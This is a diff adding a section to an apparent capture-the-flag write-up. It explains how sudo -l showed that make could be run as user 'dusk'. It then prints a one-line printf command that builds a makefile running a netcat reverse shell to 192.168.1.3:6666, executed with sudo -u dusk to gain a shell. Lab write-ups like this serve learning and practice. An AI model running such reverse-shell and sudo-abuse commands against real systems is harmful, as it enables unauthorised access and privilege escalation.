@@ -137,3 +137,9 @@ In theory, if I killed `1141` or `1143`, above, then the cron job should start a
 Before trying, I ran `/usr/bin/php -S 0.0.0.0:8081 -t /var/tmp` to start a secondary server as www-data.
 
 When I killed the server, it came back shortly. Doing a whoami, however, revealed it was still www-data. Relooking at the mail message, and examining the new logs, I saw it was actually restarting the server for www-data, not dusk /facepalm
+
+## Learning how sudo works, again
+
+I went back to look at make, which sudo -l told me I could use. It said (dusk) NOPASSWD, so why was I getting a sudo prompt when I ran it with sudo /usr/bin/make? Eventually I figured it out: sudo -l was telling me I could use sudo to act as dusk for the command, but I needed to specify dusk when running sudo!
+
+I created a makefile for a reverse netcat using `printf "all:\n\tnc 192.168.1.3 6666 -e /bin/bash" > makefile`, then ran it with `sudo -u dusk /usr/bin/make`, and sure enough it worked and I had a dusk shell :D
